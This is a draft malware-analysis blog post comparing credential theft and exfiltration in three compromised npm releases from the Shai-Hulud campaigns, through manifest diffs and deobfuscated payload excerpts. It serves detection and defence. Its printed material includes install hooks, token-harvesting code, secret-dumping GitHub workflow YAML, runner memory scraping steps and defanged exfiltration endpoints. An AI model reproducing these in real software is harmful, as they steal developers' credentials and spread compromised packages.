---
title: "Shai-Hulud Deep Dive: From the Original to Second Coming and Mini"
published: 2026-10-08
description: "Comparing credential collection and exfiltration in original Shai-Hulud and later variants through release diffs for @ctrl/tinycolor, @asyncapi/cli, and @antv/adjust"
tags: ["npm", "Supply Chain Security", "Shai-Hulud", "Malware Analysis", "CI/CD"]
category: "Security"
lang: "en"
urlSlug: "shai-hulud-diff-analysis"
translationKey: "shai-hulud-diff-analysis"
draft: true
---

Hello! In the [previous post](/en/posts/shai-hulud-campaign/), I covered the broader Shai-Hulud campaign. This post follows actual package diffs from the original `@ctrl/tinycolor` sample through Second Coming's `@asyncapi/cli` and the Mini AntV case in `@antv/adjust`.

This time, I will focus on **where the code gets credentials and keys, and how it sends them out**. We will start with the original sample, then compare how the later cases change collection targets and token reuse. Every diff compares **a baseline and a malicious release of the same package**.

## Samples and reading guide

| Case | Baseline → malicious release | Added files | Main focus |
| --- | --- | --- | --- |
| Original · September 2025 | `@ctrl/tinycolor` `4.1.0 → 4.1.1` | `bundle.js` | Local tokens, home directory scans, and cloud secrets |
| Second Coming · November 2025 | `@asyncapi/cli` `4.1.1 → 4.1.3` | `setup_bun.js`, `bun_environment.js` | Recovering Actions secrets through artifacts and reusing them |
| Mini AntV case · May 19, 2026 | `@antv/adjust` `0.2.5 → 0.3.5` | Root `index.js` | Runner memory, additional secret stores, and encrypted exfiltration |

In all three pairs, **`package.json` is the only existing file that changes, and executable files are added**. The package's normal functionality can remain intact while an install script runs the new file with the installation process's access to credentials.

> **Scope:** This is a static analysis of three selected releases. Collection and transmission paths in the code are separate from evidence that they succeeded in an affected environment. The chronological comparison does not establish continuous development by the same actor or cover every Mini variant. Sample sources and integrity limitations are collected at the end.

## Original — @ctrl/tinycolor

### Install diff: an execution path added to a color library

Below is the complete saved `package.json` diff.

```diff
--- normal_raw/package/package.json
+++ malicious_raw/package/package.json
@@ -1,6 +1,6 @@
 {
   "name": "@ctrl/tinycolor",
-  "version": "4.1.0",
+  "version": "4.1.1",
   "description": "Fast, small color manipulation and conversion for JavaScript",
   "author": "Scott Cooper <scttcper@gmail.com>",
   "publishConfig": {
@@ -34,7 +34,8 @@
     "docs:build": "typedoc --out demo/dist/docs --hideGenerator --tsconfig tsconfig.build.json src/public_api.ts",
     "test": "vitest run",
     "test:watch": "vitest",
-    "test:ci": "vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml"
+    "test:ci": "vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml",
+    "postinstall": "node bundle.js"
   },
   "devDependencies": {
     "@ctrl/eslint-config": "4.0.14",
@@ -56,4 +57,4 @@
   "engines": {
     "node": ">=14"
   }
-}
+}
\ No newline at end of file
```

The key addition is `postinstall: node bundle.js`. Of the baseline's 41 files, only `package.json` changes, and a roughly 3.7 MB `bundle.js` is added. **No call to a tinycolor function is needed**: the payload can run during installation when lifecycle scripts are allowed.

Starting at `main()` near the end of the bundle and tracing its modules reveals three collection paths.

| Collection path | Available data or access | Intended result |
| --- | --- | --- |
| Local environment | Environment variables, `.npmrc`, GitHub CLI, home directory | npm and GitHub tokens, secrets in files |
| Cloud APIs | Locally available AWS and GCP credentials | Values from Secrets Manager / Secret Manager |
| GitHub Actions | A recovered GitHub token used to write workflows | Secrets made available when a workflow runs |

### 1. npm and GitHub tokens: reading existing developer credentials

The first source of an npm token is `NPM_TOKEN`. If it is absent, execution moves to `parseNpmToken()`.

```js
let re = process.env.NPM_TOKEN;
re || (re = (0, _lib_utils__WEBPACK_IMPORTED_MODULE_1__.parseNpmToken)() ?? void 0);
```

The parser reads **`.npmrc` in the current working directory, then `.npmrc` in the user's home directory**, returning the first value that matches this expression.

```js
const r = /(?:_authToken|:_authToken)=([a-zA-Z0-9\-._~+/]+=*)/,
  n = t ? [t] : [te.join(process.cwd(), ".npmrc"), te.join(re.homedir(), ".npmrc")];
```

This retrieves an existing `_authToken` from the development environment; it does not request a new credential from npm.

GitHub follows a similar pattern. `GitHubModule.getToken()` prefers `GITHUB_TOKEN` and otherwise reads the output of `gh auth token`. A developer's existing GitHub CLI login therefore becomes another token source.

| Target | Lookup order | Interpretation |
| --- | --- | --- |
| npm | `NPM_TOKEN` → working-directory `.npmrc` → home `.npmrc` | `/-/whoami` identifies the user; package publishing permission is separate |
| GitHub | `GITHUB_TOKEN` → `gh auth token` | `isAuthenticated()` only checks token presence; `getUser()` performs the user lookup |

**Having a token and having valid permissions are different conditions.** A result field named `authenticated` is not enough to establish successful authentication.

### 2. TruffleHog: finding secrets left in the home directory

Beyond directly reading tokens, the payload uses TruffleHog. If the executable is missing from the working directory, it prepares one from the official release. These two excerpts show where the scan actually runs.

```js
const le = ["filesystem", t, "--json", "--results=verified"];
```

```js
const t = (0, te.spawn)(this.binaryPath, le, {
  cwd: ie.homedir(),
  env: process.env,
  stdio: ["pipe", "pipe", "pipe"]
})
```

The default target `t` in `scanFilesystem()` is `.`, but the child process's `cwd` is the user's home directory. It therefore scans **files in the home directory rather than the package directory**.

- `--results=verified` is an output filter passed to the tool.
- The default timeout is 90 seconds, and standard output is accumulated as a string.
- That output enters the exfiltration object. npm propagation in `main()` runs in a separate parallel branch, so **this does not establish that tokens found by TruffleHog are fed directly into republishing**.

### 3. AWS and GCP: using credentials to retrieve secret values

The AWS module considers `AWS_PROFILE` or `default`, along with profile names from `~/.aws/credentials` and `~/.aws/config`. The following code uses a profile's credentials to request identity information from STS.

```js
const t = (0, re.fromIni)({profile: r}),
  n = new F.STSClient({region: "us-east-1", credentials: t}),
  te = await n.send(new F.GetCallerIdentityCommand({}));
```

After selecting the first validated profile, it calls `ListSecrets` and `GetSecretValue` across 14 fixed regions. The resulting `secretString` and `secretBinary` fields hold **actual Secrets Manager values readable with those permissions**. However, this implementation does not paginate with `NextToken`, so it cannot be described as exhaustively reading the entire list.

For GCP, `GoogleAuth` supplies the project and authentication client, and `SecretManagerServiceClient` retrieves the secret list and values.

```js
const n = `projects/${this.projectInfo.projectId}/secrets/${t}/versions/${r}`,
  [F] = await this.secretsClient.accessSecretVersion({name: n}),
  te = F.payload?.data?.toString();
```

The default argument in `getSecretValue(t, r="latest")` selects each secret's `latest` version. Obtaining a project ID and authentication client does not guarantee permission to read individual secrets.

Both paths connect **local credentials → service API → stored secret values**. The payload can steal credentials themselves and use available credentials to retrieve additional secrets.

### 4. Actions secrets: using the workflow execution context

For secrets beyond local files, the payload turns to GitHub Actions. The embedded `processor.sh`, launched by `GitHubModule.extraction()`, checks for `repo` and `workflow` scopes, then writes a separate branch and `.github/workflows/shai-hulud-workflow.yml` in target repositories.

The collection sequence is:

1. Configure the inserted workflow to run on `push`.
2. Place `${{ toJSON(secrets) }}` in the `CONTENTS` environment variable.
3. Send the value to an external webhook and also print it to logs after two Base64 passes.

The embedded destination is shown below in defanged form.

```text
hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7
```

The plaintext does not come from the secrets listing API. Instead, **the job extracts secrets supplied to the workflow when it runs**. Repository write access, workflow permissions, and the Actions execution conditions still matter; this does not provide unconditional access to every organization secret.

### 5. Exfiltration: data.json in a public repository

`main()` combines the results into one object and passes it to `makeRepo("Shai-Hulud", ...)`.

| Field | Data included for exfiltration |
| --- | --- |
| `environment` | All of `process.env`, without filtering variable names |
| `modules.github`, `modules.npm` | Recovered tokens and related lookup results |
| `modules.aws.secrets`, `modules.gcp.secrets` | Secret values successfully read through the APIs |
| `modules.truffleHog` | Home directory scan output, status, and errors |

`makeRepo()` creates a public repository named `Shai-Hulud` **under the account associated with the token it uses**, then writes `data.json`. Looking only for a fixed attacker-owned account would miss this design.

The Contents API's `content` value receives three Base64 passes.

```js
content: Buffer.from(
  Buffer.from(
    Buffer.from(r).toString("base64")
  ).toString("base64")
).toString("base64")
```

The outermost layer is the API's file-content transport format, leaving two layers in the stored file. **Base64 is not encryption and can be reversed without a secret key.**

The original sample collects tokens and secrets accessible during installation and sends them through public repositories and workflow output paths. npm propagation separately uses the initially recovered token to try to insert the same payload and install command into other packages.

## Second Coming — @asyncapi/cli

> **Key change from the original:** GitHub token discovery expands, and Actions secrets are recovered through artifacts and reused as npm token candidates. Public exfiltration repositories also become a source of tokens for subsequent executions.

### Install diff: a Node loader leading to a Bun payload

Below is the complete `package.json` diff for the collected `4.1.1 → 4.1.3` pair.

```diff
--- normal_raw/package/package.json
+++ malicious_raw/package/package.json
@@ -1,7 +1,7 @@
 {
   "name": "@asyncapi/cli",
   "description": "All in one CLI for all AsyncAPI tools",
-  "version": "4.1.1",
+  "version": "4.1.3",
   "author": "@asyncapi",
   "bin": {
     "asyncapi": "./bin/run_bin"
@@ -200,7 +200,8 @@
     "api:docker": "docker run -it -p 80:80 asyncapi/server-api",
     "api:build:docker": "docker build -t asyncapi/server-api -f ./src/apps/api/Dockerfile .",
     "api:build": "rimraf lib && npm run generate:languages && tsc && tsc-alias --project tsconfig.json",
-    "api:test": ""
+    "api:test": "",
+    "preinstall": "node setup_bun.js"
   },
   "types": "lib/index.d.ts"
-}
+}
\ No newline at end of file
```

The execution chain is **`preinstall` → `setup_bun.js` → Bun → `bun_environment.js`**. The loader finds or installs Bun, then runs the payload already included in the npm release. As in the original, the attack adds an installation path while leaving the normal implementation files intact.

The payload excerpts below have string lookups statically substituted. Variable names and operators are preserved, with line breaks added for readability.

### 1. GitHub tokens: looking at environment values

npm token discovery retains the original `NPM_TOKEN → .npmrc` sequence. GitHub's `dq.findGitHubTokenEnvVars()` changes it.

| Source | Original | Second Coming |
| --- | --- | --- |
| Environment variables | Only `GITHUB_TOKEN` | First value across the environment starting with `ghp_` or `gho_` |
| GitHub CLI | `gh auth token` | The same prefix check also applies to CLI output |
| Publicly leaked data | This fallback path was not identified | Recover a token from another repository's `contents.json` |

A matching prefix makes a value a candidate regardless of its variable name. Token types outside this prefix check are not automatically selected.

If the local token is missing or the exfiltration repository cannot be created, `dq.fetchToken()` tries the following path:

1. Search repositories for `"Sha1-Hulud: The Second Coming."`. The last character of `Sha1` is the digit `1`.
2. Read `main/contents.json` from a result and decode Base64 to obtain JSON.
3. Extract `modules.github.token` and check it against a 200 response from `GET /user`.
4. Configure a new GitHub client with the recovered token.

**Leaked data becomes an authentication source for another infection.** However, this fallback-token path skips the Actions secret collection described below and the npm retries based on those results.

### 2. Actions secrets: recovering artifacts instead of using a webhook

The original workflow sent secrets to a webhook and logs. Second Coming's `ky1()` → `mq.processReposStream()` has **the payload retrieve the workflow's results itself**.

| Stage | Behavior in the code |
| --- | --- |
| Select targets | Pass up to 50 repositories meeting the recent-update condition; skip those whose Actions secrets list has a count of zero |
| Write a workflow | Create `.github/workflows/formatter_123456789.yml` on a separate branch |
| Extract secrets | Use `DATA: ${{ toJSON(secrets)}}` to write `format.json` |
| Upload an artifact | Upload the file under the name `formatting` |
| Retrieve and clean up | Read JSON from the run's artifact ZIP, then attempt to delete the run and branch |

Although named `Code Formatter`, the workflow's data source is **the secrets made available to the workflow**. The secrets listing API is used to select targets; it does not return plaintext values.

Recovered values go into `actionsSecrets.json`. If local npm token validation fails, values in each object matching the following condition are passed to `El()`.

```js
for (let [_0x11c4f3, _0x402786] of Object['entries'](_0x5998e5))
  if (typeof _0x402786 === "string" && _0x402786['startsWith']("npm_")) {
```

This connects **Actions secret → `npm_` token candidate → further propagation attempt**. It differs from the original's separate TruffleHog scan. The retry condition depends on npm authentication, so a publish failure with an already authenticated token does not necessarily return to this path.

A permission-check bug also matters when interpreting the result. `dq.checkWorkflowScope()` stores the scope check but always returns true on its successful request path.

```js
return this["hasWorkflow"] = _0x1accf9['includes']("workflow"),
  console["log"]("Error 18"), !0x0;
```

A true return value therefore does not establish workflow modification permission. GitHub API permissions and Actions policies still have to allow the operation.

### 3. Cloud and file scanning: expanded targets versus collected results

| Target | Change from the original | Limit on actual collection |
| --- | --- | --- |
| AWS | Adds env, SSO, tokenFile, container, instance, and process providers alongside file profiles; 17 regions and pagination | The array accumulation bug below |
| GCP | Searches projects, then reads each secret's `latest` version | Selects only the first project result |
| Azure | Adds `DefaultAzureCredential` → Key Vault listing → `getSecret()` | Uses the first subscription and requires resource and secret read permissions |
| TruffleHog | Home scan timeout increases from 90 to 600 seconds; JSON lines are parsed into a `findings` array | No `--results=verified` filter, so result selection differs from the original |

AWS credential discovery covers more sources, but `WX.runSecrets()` contains this code:

```js
_0x1dbe92["concat"](
  await _0x388e01["listAndRetrieveAllSecrets"]()
);
```

`concat()` returns a new array. Because that return value is discarded, **secrets do not accumulate in this function's returned array even if retrieval succeeds**. A broader API query path does not establish that the values reach `cloud.json`. AWS keys may still leak through other paths, such as environment variables.

Azure support goes beyond an SDK being bundled. `aL0()` calls `Eq.listAndRetrieveAllSecrets()` and places its return value in `azure.secrets`, connecting the entry point to the exfiltration object.

### 4. Exfiltration: from one file to five

The public repository now has a random 18-character name and the description `Sha1-Hulud: The Second Coming.`. Data is separated by purpose.

| File | Contents |
| --- | --- |
| `contents.json` | System information, GitHub token, and user lookup result |
| `environment.json` | All environment variables |
| `cloud.json` | Return values from the AWS, GCP, and Azure collectors |
| `truffleSecrets.json` | Parsed TruffleHog findings and raw output |
| `actionsSecrets.json` | Secret objects recovered from workflow artifacts |

Each file depends on its branch and write operation succeeding. As in the original, two Base64 layers remain in the stored files; this is still not encryption.

The more important change in Second Coming is **how stolen values are reused**. GitHub tokens from public repositories can help establish another exfiltration path, while npm tokens from Actions artifacts feed further propagation attempts.

## Mini AntV case — @antv/adjust

> **Key change from the preceding cases:** Collection expands from files and environment variables to current runner memory, Kubernetes, Vault, and password manager CLIs. Results enter a common processing path, and the transmitted payload uses actual encryption.

### Install diff: direct Bun execution and a Git dependency

Below is the complete `package.json` diff for `0.2.5 → 0.3.5`.

```diff
--- normal_raw/package/package.json
+++ malicious_raw/package/package.json
@@ -1,6 +1,6 @@
 {
   "name": "@antv/adjust",
-  "version": "0.2.5",
+  "version": "0.3.5",
   "description": "The adjust module for G2, F2.",
   "main": "lib/index.js",
   "module": "esm/index.js",
@@ -23,7 +23,8 @@
     "lib": "run-p lib:*",
     "build": "run-s clean lib",
     "ci": "run-s build coverage",
-    "coveralls": "cat ./coverage/lcov.info | coveralls"
+    "coveralls": "cat ./coverage/lcov.info | coveralls",
+    "preinstall": "bun run index.js"
   },
   "dependencies": {
     "@antv/util": "~2.0.0",
@@ -88,5 +89,8 @@
     "f2"
   ],
   "author": "https://github.com/orgs/antvis/people",
-  "license": "MIT"
-}
+  "license": "MIT",
+  "optionalDependencies": {
+    "@antv/setup": "github:antvis/G2#1916faa365f2788b6e193514872d51a242876569"
+  }
+}
\ No newline at end of file
```

`preinstall` runs the newly added root `index.js`. The files referenced by `main: lib/index.js` and `module: esm/index.js` remain unchanged; the normal library entry points have not been replaced.

Unlike Second Coming, the root install command directly requires Bun. `@antv/setup` also points to a fixed GitHub commit, but **the external dependency's payload was not obtained, so it is not treated as identical to the local `index.js`**. The analysis below concerns the collected 498,431-byte payload.

Excerpts have string lookups and encrypted constants statically recovered. Function and variable names are preserved. These are not results from executing the sample.

### 1. Bringing file, environment, and CLI results together

Initial collection in `Z2()` calls `zo → vo → ko` in sequence.

| Collector | Source | Main data of interest |
| --- | --- | --- |
| `zo` | OS-specific file and glob lists | `.npmrc`, `.env`, SSH keys, cloud credential files, kubeconfig, Docker configuration, and more |
| `vo` | `process.env`, `gh auth token` | Environment variables and GitHub CLI tokens |
| `ko` | Runner memory in Linux GitHub Actions | Traces of secrets supplied to the current job |

Files are collected up to 5 MiB per item. Content identified as binary is stored with a `BASE64:` prefix. Wallet and messaging paths also appear in the collection list, but retrieving a file does not establish that the service's encrypted contents can be decrypted.

`S.success()` serializes results and creates `matches` using **regular expressions registered with that collector**. `Po.ingest()` receives those results and starts token checks. The npm connection appears in the following code.

```js
// Po.handleNpmTokens()의 복원 코드
for (let _0x295898 of _0x4d3cb8) {
  let _0x5114b9 = await m7(_0x295898);
  await new Ro(_0x5114b9)["execute"]();
}
```

The chain is **npm token in a collection result → permission checks in `m7()` → republishing through `Ro`**. This expands the input paths beyond Second Coming's Actions artifact reuse. The same pattern matching does not automatically apply to every cloud result, however.

`m7()` checks the token list for conditions including `bypass_2fa === true` and package `write` permission. This **selects a token that already has the required permissions**; it does not break 2FA itself.

### 2. Finding secrets in Runner.Worker memory

One of Mini's most notable additions is `ko`. The artifact approach runs a new workflow, while this collector tries to read **data already held by the current runner**.

```js
// ko.execute()의 진입 조건
if (!this["isGitHubActions"] || !this["isLinuxRunner"])
  return this["failure"]("Not Actions or Linux");
```

The constructor sets these conditions from `GITHUB_ACTIONS === "true"` and `RUNNER_OS === "Linux"`. This restriction applies to the memory collector, not to all of Mini's execution paths.

The subsequent data flow has four steps:

1. **Find the process:** Look for `Runner.Worker` in `/proc/<pid>/cmdline`.
2. **Read memory:** Pass embedded Python `q7` to `sudo python3`, then read `/proc/<pid>/mem` across readable regions listed in `/proc/<pid>/maps`.
3. **Extract secrets:** `V2()` removes NUL bytes and searches for the form `"name":{"value":"...","isSecret":true}`.
4. **Return results:** Organize names and values alongside repository and workflow information, the number found, and dump size.

This relies on access to the runner process's memory; it is not a GitHub API returning plaintext secrets. It therefore requires usable `sudo`, permission to read process memory, and data matching the expected format.

A method named `detectHardenRunner()` also exists, but this `execute()` does not call it. Its name alone does not establish that protection detection or bypass actually occurs.

### 3. AWS, Kubernetes, Vault, and password manager CLIs

The following collectors run after initial collection.

```js
[new Do(), new Xo(), new Fo(), new ao(), new $o(), new fo()]
```

| Class | Intended data | Authentication and permissions used |
| --- | --- | --- |
| `Do` | AWS SSM Parameter Store values | Available AWS credentials, read and decryption permissions |
| `Xo` | AWS Secrets Manager secrets | Regional list and value-read permissions |
| `Fo` | AWS account, ARN, and user identity | STS validation; results primarily describe identity rather than secret contents |
| `ao` | Base64-decoded `data` from Kubernetes Secrets | Service account or kubeconfig token, API access, and RBAC permissions |
| `$o` | Vault KV v1/v2 values | Environment or file tokens, or Kubernetes/AWS IAM authentication conditions |
| `fo` | Output from `op`, `bw`, `pass`, and `gopass` | Installed CLIs and usable sessions or authentication methods |

AWS results are combined with `push(...ids)` and `Object.assign()`, unlike Second Coming's discarded `concat()` return value. Kubernetes and Vault continue the pattern of using existing access to read additional secrets.

Two limits are worth keeping explicit:

- **Vault:** It processes up to 100 list entries and skips subpaths ending in `/`. This is not recursive retrieval of every secret.
- **Password managers:** Collection depends on usable CLI sessions or authentication. It does not generally defeat the products' encryption or 2FA.

GCP and Azure appear in the initial file collection list, but the array above has no dedicated API collectors for them. That should not be conflated with Second Coming's Azure Key Vault API queries.

### 4. Actions artifact collection remains

If the initial results contain a valid GitHub PAT/OAuth token, `Io` is added. It checks workflow scope, then writes `.github/workflows/codeql.yml` in up to 5 repositories with secrets.

The recovered workflow takes its data from:

```yaml
    env:
      VARIABLE_STORE: ${{ toJSON(secrets) }}
```

The receiving step writes those secrets to a file.

```yaml
      - name: Copilot Setup
        run: echo "$VARIABLE_STORE" > format-results.txt
```

The workflow is named `Run Copilot`, and its path resembles CodeQL, but its actual behavior is to upload `format-results.txt` as an artifact. The payload's `R1()` reads that file from the ZIP, while `P1()` attempts to clean up the run and branch.

**Workflow insertion → artifact retrieval** remains similar to Second Coming. In Mini, however, recovered values return through the common collection path and connect to `Po → m7 → Ro`. Repository write access, workflow permissions, and execution policies still apply.

### 5. The transmitted payload: from Base64 to AES-GCM and RSA

Mini's `eu.createEnvelope()` transforms collected results in this order:

**JSON → gzip → AES-256-GCM encryption → transmission object**

The central excerpt is:

```js
// eu.createEnvelope()의 암호화 부분 발췌
_0x502c81 = _0x2bfbd9["randomBytes"](0x20),
_0x919746 = _0x2bfbd9["randomBytes"](0xc),
_0x4cf9d2 = _0x2bfbd9["publicEncrypt"]({
  'key': G7,
  'padding': _0x2bfbd9["constants"]["RSA_PKCS1_OAEP_PADDING"],
  'oaepHash': "sha256"
}, _0x502c81),
_0x6eccff = _0x2bfbd9["createCipheriv"](
  "aes-256-gcm", _0x502c81, _0x919746
);
```

| Element | Construction |
| --- | --- |
| Symmetric key | A fresh 32-byte key each time |
| IV | A fresh 12-byte value each time |
| `envelope` | Base64 of the concatenated `IV · ciphertext · tag` |
| `key` | The symmetric key encrypted with embedded public key `G7` using RSA-OAEP/SHA-256, then Base64-encoded |

For the original and Second Coming, decoding Base64 exposed the JSON. Mini's envelope **cannot be read as plaintext by Base64 decoding alone**. This transmission encryption uses a different key and serves a different purpose from the encryption of embedded resources recovered during analysis.

The HTTPS sender `lr` and GitHub sender `_r` share this format. The default HTTPS destination is shown below in defanged form.

```text
hxxps://t[.]m-kosche[.]com:443/api/public/otel/v1/traces
```

The GitHub sender creates a public repository with a random name and the description `niagA oG eW ereH :duluH-iahS`. Results are written to `results/results-<timestamp>-<counter>.json`.

### 6. Some tokens remain outside the encryption

Not every secret stays inside the envelope. `lo.configureGit()` enables `includeToken` when `/user/orgs`, queried with a local token, returns an empty result. Query errors are also treated as empty arrays, so this condition is not limited to accounts genuinely belonging to no organization.

In this mode, `_r.augmentEnvelope()` **places the GitHub token in use into a separate field and commit message after two Base64 passes**. It remains outside the AES ciphertext and can be recovered.

Conversely, `q1()` searches commits carrying the marker `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner`, recovers a token, and checks its repository scope. Second Coming's reuse of `contents.json` becomes **token exchange through commit messages** in this Mini sample.

This disclosure mode also connects to installation of a separate monitor that attempts deletion under certain status conditions. Here, I am keeping the focus on token disclosure and reuse, leaving service installation and deletion-command details outside the analysis.

The initial sender-selection code also omits `await` on `healthy()` calls, and response checking for GitHub file writes is incomplete. The presence of fallback paths therefore does not establish successful transmission in every environment.

## Comparing the three cases: what is stolen, and where it goes

| Aspect | Original | Second Coming | Mini AntV sample |
| --- | --- | --- | --- |
| Local tokens | Named environment variables, `.npmrc`, `gh` | npm path retained; GitHub environment values searched | Pattern matching on file, environment, and CLI results |
| Secrets in files | TruffleHog home scan | Longer home scan and parsed findings | Built-in file collection and common result processing |
| Actions secrets | Workflow → webhook and logs | Workflow → artifact retrieval | Artifact approach plus current runner memory |
| Service APIs | AWS Secrets Manager, GCP Secret Manager | More AWS credential sources, GCP, Azure Key Vault | AWS SSM and Secrets Manager, Kubernetes, Vault, password CLIs |
| Exfiltration | Public `Shai-Hulud/data.json` | Five purpose-specific files in a public repository | Encrypted objects over HTTPS or in a public repository |
| Data protection | Base64, no encryption | Base64, no encryption | AES-GCM + RSA, with a separate disclosed-token exception |
| Reuse of collected values | Initial npm token propagation is separate from TruffleHog | npm tokens from Actions; GitHub tokens from public repositories | Tokens from results with registered patterns; GitHub tokens from commits |

The differences become clearer when we follow **how collection results feed subsequent authentication and propagation**. A broader collection scope can still produce limited transmitted data because of missing permissions or bugs in result accumulation.

## Detection: what happens after the install process reads a secret?

For these samples, a useful review follows **install entry point → credential access → external writes**. File names or Bun usage alone do not establish that chain.

| Connection to examine | Code evidence in this post | Evidence to correlate |
| --- | --- | --- |
| A new install command followed by credential-file or home-directory access | `parseNpmToken()`, TruffleHog, `zo`, `vo` | Manifest diff, parent and child processes, file access records |
| Secret-store API calls during installation | AWS, GCP, Azure modules; Mini's `Do`, `Xo`, `ao`, `$o` | API audit records, caller identity, permissions, and responses |
| A runner accessing another process's memory | Mini's `ko` and `q7` | `sudo` and Python execution, `/proc/<pid>/mem` access targeting `Runner.Worker` |
| A new workflow sending secrets to files, logs, or external destinations | Original `processor.sh`, Second Coming `mq`, Mini `Io` | Workflow diff, runs, artifacts, and outbound traffic |
| Writes to public repositories or collection endpoints after installation | `makeRepo()`, `dq`, `lr`, `_r` | Repository creation, commits and file contents, network records |

GitHub serves as **an exfiltration destination, an execution environment for secret collection, and a source of reusable tokens**. The contacted domain alone does not reveal its role. Names such as `Code Formatter`, `CodeQL`, and `Copilot` also say little about the data a workflow reads and sends.

With Mini, even a captured request body may reveal only ciphertext. Separate `token` fields and commit messages may still use a reversible encoding, so those need to be distinguished.

> **Limits on impact assessment:** A malicious file in a release, actual execution, access to a secret, and a successful external write are different pieces of evidence. Static code alone cannot establish a particular organization's exposure or count successful propagation events.

## Closing thoughts

All three releases use a small manifest change to open an installation-time execution path and use permissions already available in the development environment. The original shows the basic collection of local tokens and home-directory and cloud secrets. Second Coming retrieves and reuses Actions secrets, while Mini connects runner memory and additional secret stores to a common collection path.

The central thread is **credential source → code that reads it → result destination → exfiltration or reuse**. Following that chain explains which secrets an installation can reach and how the later cases differ, without cataloging every function in a large bundle.

## Analysis materials and references

<details>
<summary>Sample sources, hashes, and analysis scope</summary>

The malicious Original and Second Coming artifacts were collected and matched against extracted files from DataDog's archives at a fixed commit. All 42 and 259 files, respectively, matched. Original tarball integrity records for the baseline releases were not retained.

- [tinycolor 4.1.1 archive](https://github.com/DataDog/malicious-software-packages-dataset/blob/6894a19488438132de460273c09d5fc7944c1a47/samples/npm/compromised_lib/%40ctrl%40tinycolor/4.1.1/2025-09-15-%40ctrl_tinycolor-v4.1.1.zip)
- [AsyncAPI CLI 4.1.3 archive](https://github.com/DataDog/malicious-software-packages-dataset/blob/6894a19488438132de460273c09d5fc7944c1a47/samples/npm/compromised_lib/%40asyncapi%40cli/4.1.3/2025-11-24-%40asyncapi_cli-v4.1.3.zip)

Mini's baseline has an npm integrity verification record. The malicious artifact is supported by files collected from a mirror and a published payload hash. The external Git dependency's payload was not obtained. Integrity verification and a benignness assessment are separate questions.

```text
bundle.js
SHA-256: 46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09
```

```text
setup_bun.js
SHA-256: a3894003ad1d293ba96d77881ccd2071446dc3f65f434669b49b3da92421901a

bun_environment.js
SHA-256: 62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0
```

```text
index.js
SHA-256: a68dd1e6a6e35ec3771e1f94fe796f55dfe65a2b94560516ff4ac189390dfa1c
```

Second Coming and Mini excerpts use statically recovered strings and embedded resources. No malicious files were executed, external tokens used, C2 communications performed, or republishing reproduced. Detailed propagation, persistence, and deletion implementations are outside this post's focus on credential theft.

</details>

- [Campaign overview](/en/posts/shai-hulud-campaign/)
- [Socket: Tinycolor supply chain investigation](https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages)
- [Wiz: Original Shai-Hulud](https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack)
- [Wiz: Shai-Hulud 2.0](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
- [Microsoft: Mini Shai Hulud and the AntV case](https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/)
- [Socket: AntV package compromise](https://www.socket.dev/blog/antv-packages-compromised)
- [npm: lifecycle scripts](https://docs.npmjs.com/cli/v11/using-npm/scripts/)
- [GitHub: using secrets in workflows](https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets)

<!-- Author notes: local source directories relative to the capstone workspace.
npm-analysis/output/shai-hulud-blog-sources/01_original_2025-09/samples/01_tinycolor
npm-analysis/output/shai-hulud-blog-sources/02_second_coming_2025-11/samples/03_asyncapi-cli
npm-analysis/output/shai-hulud-blog-sources/03_mini_2026-05/samples/01_antv-adjust
Use meta.json, raw_manifest.json, diff_manifest.json, and diffs_by_file/ as evidence.
Update the publication date when publishing and complete both language versions.
-->
